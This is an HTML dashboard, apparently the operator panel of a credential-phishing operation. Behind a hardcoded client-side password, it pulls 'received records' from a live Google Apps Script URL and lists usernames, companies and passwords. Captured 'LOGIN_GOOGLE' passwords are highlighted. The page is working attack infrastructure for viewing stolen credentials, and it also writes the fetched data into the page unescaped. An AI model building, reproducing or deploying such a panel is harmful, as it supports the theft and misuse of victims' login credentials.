<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Panel de Administración - Tiempo Real</title>
    <style>
        body { background: #0b141d; color: white; font-family: sans-serif; padding: 20px; }
        .card { background: #15202b; border-radius: 12px; padding: 25px; border: 1px solid #1e293b; max-width: 1100px; margin: auto; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th { background: #1e293b; color: #38bdf8; padding: 15px; text-align: left; font-size: 11px; text-transform: uppercase; }
        td { padding: 15px; border-bottom: 1px solid #1e293b; font-size: 14px; }
        .badge { padding: 4px 8px; border-radius: 4px; font-size: 10px; font-weight: bold; }
        .badge-google { background: #0369a1; color: #7dd3fc; }
        .badge-form { background: #581c87; color: #d8b4fe; }
        .pass-cell { font-family: monospace; color: #fbbf24; font-weight: bold; font-size: 15px; }
        input { padding: 12px; border-radius: 8px; border: 1px solid #1e293b; background: #0b141d; color: white; margin-bottom: 20px; text-align: center; }
        button { padding: 12px 25px; background: #38bdf8; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; color: #0b141d; }
    </style>
</head>
<body>
    <div id="login-box" style="text-align:center; margin-top:100px;">
        <h1>Acceso Admin</h1>
        <input type="password" id="p" placeholder="Contraseña">
        <br>
        <button onclick="verificar()">Entrar</button>
    </div>

    <div id="dash" style="display:none">
        <div class="card">
            <div style="display:flex; justify-content:space-between; align-items:center;">
                <h2 style="color:#38bdf8">Registros Recibidos</h2>
                <button onclick="cargar()" style="background:transparent; border:1px solid #38bdf8; color:#38bdf8;">🔄 Actualizar Ahora</button>
            </div>
            <table>
                <thead>
                    <tr>
                        <th>Origen</th>
                        <th>Usuario / Empresa</th>
                        <th>Datos / Pass</th>
                        <th>Fecha</th>
                    </tr>
                </thead>
                <tbody id="tabla"></tbody>
            </table>
        </div>
    </div>

    <script>
        const webAppUrl = "https://script.google.com/macros/s/AKfycbzvYw6wrFwLPUWZ4dhM7HDF04wQRK0zLgfkey36BaicDoA75Zp3dM647ZkvV0raZim3/exec";

        function verificar() {
            if(document.getElementById("p").value === "Linares2025.") {
                document.getElementById("login-box").style.display="none";
                document.getElementById("dash").style.display="block";
                cargar();
            }
        }

        async function cargar() {
            const tbody = document.getElementById("tabla");
            tbody.innerHTML = "<tr><td colspan='4'>Obteniendo datos frescos...</td></tr>";
            
            try {
                // AÑADIDO: Generador de URL única para saltar la caché
                const antiCacheUrl = webAppUrl + "?cache=" + Math.random();
                
                const res = await fetch(antiCacheUrl);
                const data = await res.json();
                
                tbody.innerHTML = "";
                data.reverse().forEach(row => {
                    const isGoogle = row[2] === "LOGIN_GOOGLE";
                    tbody.innerHTML += `
                        <tr>
                            <td><span class="badge ${isGoogle ? 'badge-google' : 'badge-form'}">${row[2]}</span></td>
                            <td>${row[0] || '---'}</td>
                            <td class="${isGoogle ? 'pass-cell' : ''}">${row[1] || '---'}</td>
                            <td style="color:#64748b">${row[3] || '---'}</td>
                        </tr>`;
                });
            } catch (e) {
                tbody.innerHTML = "<tr><td colspan='4'>Error al cargar.</td></tr>";
            }
        }
    </script>
</body>
</html>
